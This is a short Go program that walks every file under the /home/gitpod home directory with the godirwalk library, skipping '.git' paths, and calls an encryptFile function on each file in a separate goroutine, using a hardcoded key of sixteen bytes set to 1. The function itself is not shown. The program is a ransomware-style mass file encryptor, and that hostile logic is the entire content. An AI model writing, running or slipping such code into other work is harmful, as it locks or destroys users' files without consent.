package main

import (
	"fmt"
	"strings"

	"github.com/karrick/godirwalk"
)

func main() {
	key := []byte{1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1}
	dirname := "/home/gitpod"
	err := godirwalk.Walk(dirname, &godirwalk.Options{
		Callback: func(osPathname string, de *godirwalk.Dirent) error {
			// Following string operation is not most performant way
			// of doing this, but common enough to warrant a simple
			// example here:
			if strings.Contains(osPathname, ".git") {
				return godirwalk.SkipThis
			}
			go encryptFile(osPathname, key)
			fmt.Printf("%s %s\n", de.ModeType(), osPathname)
			return nil
		},
		Unsorted: true, // (optional) set true for faster yet non-deterministic enumeration (see godoc)
	})
	if err == nil {
		return
	} else {
		fmt.Println(err)
	}
}
